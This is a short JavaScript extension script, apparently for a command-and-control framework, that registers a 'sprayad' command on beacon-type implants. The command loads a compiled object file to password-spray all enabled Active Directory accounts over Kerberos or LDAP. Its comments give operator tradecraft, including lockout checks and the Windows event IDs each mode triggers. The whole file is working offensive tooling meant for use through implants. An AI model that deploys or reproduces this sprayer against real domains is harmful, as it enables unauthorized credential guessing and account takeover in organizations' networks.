var metadata = {
    name: "SprayAD",
    description: "Fast Kerberos or LDAP password spraying against Active Directory"
};

// NOTE: Check the domain password lockout policy before spraying.
// Kerberos mode (default) generates event 4771; LDAP mode generates 4625.
var cmd_sprayad = ax.create_command("sprayad", "Perform a fast Kerberos or LDAP password spraying attack against Active Directory", "sprayad <password> [-f filter] [-ldap]");
cmd_sprayad.addArgString("password", true,  "Password to test against all enabled AD accounts");
cmd_sprayad.addArgFlagString("-f", "filter", "sAMAccountName wildcard filter (e.g. admin*). Default: all accounts.", "*");
cmd_sprayad.addArgBool("-ldap", "Use LDAP authentication instead of Kerberos (faster, generates event 4625)");
cmd_sprayad.setPreHook(function (id, cmdline, parsed_json) {
    var password = parsed_json["password"];
    var filter   = parsed_json["filter"] || "*";
    var use_ldap = parsed_json["-ldap"]  ? true : false;
    var bof_path = ax.script_dir() + "SprayAD." + ax.arch(id) + ".o";

    var bof_params;
    if (use_ldap) {
        bof_params = ax.bof_pack("wstr,wstr,wstr", [password, filter, "ldap"]);
    } else {
        bof_params = ax.bof_pack("wstr,wstr", [password, filter]);
    }
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, `Task: spray AD accounts with provided password`);
});

var group_sprayad = ax.create_commands_group("SprayAD-BOF", [cmd_sprayad]);
ax.register_commands_group(group_sprayad, ["beacon", "gopher", "kharon"], ["windows"], []);
